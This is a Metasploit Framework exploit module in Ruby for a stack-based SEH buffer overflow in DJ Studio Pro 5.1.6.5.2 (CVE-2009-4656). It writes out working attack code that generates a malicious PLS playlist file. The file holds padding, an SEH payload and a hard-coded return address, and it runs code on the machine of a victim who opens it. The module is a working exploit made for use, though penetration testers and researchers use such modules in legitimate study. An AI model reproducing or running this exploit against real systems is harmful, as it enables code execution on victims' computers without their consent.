##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'DJ Studio Pro 5.1.6.5.2 SEH Exploit',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in DJ Studio Pro 5.1.6.5.2.
				An attacker must send the file to victim and the victim must open the file.
				Alternatively it may be possible to execute code remotely via an embedded
				PLS file within a browser, when the PLS extention is registered to DJ Studio Pro.
				This functionality has not been tested in this module.
			},
			'License'        => MSF_LICENSE,
			'Author' 	 =>
				[
					'Sebastien Duquette',
					'Death-Shadow-Dark <death.shadow.dark@gmail.com>',
				],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2009-4656'],
					[ 'OSVDB', '58159'],
					[ 'URL', 'http://www.exploit-db.com/exploits/10827' ],
				],
			'Payload'        =>
				{
					'Space'    => 5000,
					'BadChars' => "\x00\x0a\x3d",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x014FC62D } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 30 2009',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),
				], self.class)

	end

	def exploit

		sploit = rand_text_alpha_upper(1308)
		sploit << generate_seh_payload(target.ret)
		sploit << rand_text_alpha_upper(10000)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end